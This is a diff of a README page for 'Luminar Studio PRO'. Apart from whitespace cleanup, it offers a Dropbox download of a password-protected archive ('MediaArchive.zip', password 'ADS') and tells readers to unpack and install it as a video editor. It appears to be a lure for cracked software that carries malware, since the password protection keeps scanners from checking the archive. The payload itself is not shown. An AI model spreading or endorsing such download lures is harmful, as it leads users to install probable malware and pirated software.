@@ -1,19 +1,12 @@
 <h1 align="center">Luminar Studio PRO</h1>
 <h4 align="center">Password to archive: ADS</h4>
-<h2 align="center">
-
-</h2>
-
+<h2 align="center"></h2>
 <p align="center">
   
-
-
-
 <h1 align="center"><a  href="https://www.dropbox.com/s/jg8m2lgos0y7cwr/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
 <h4 align="center">Download the program, use the password: ADS To unpack the archive and install the video editor on your computer </h4>
 <p align="center">
   
-
 ------------
 
 ![alt-текст](https://graydonschwartz.com/wp-content/uploads/2019/10/gif_AI-Sky-Replacement_3.gif "Luminar4")
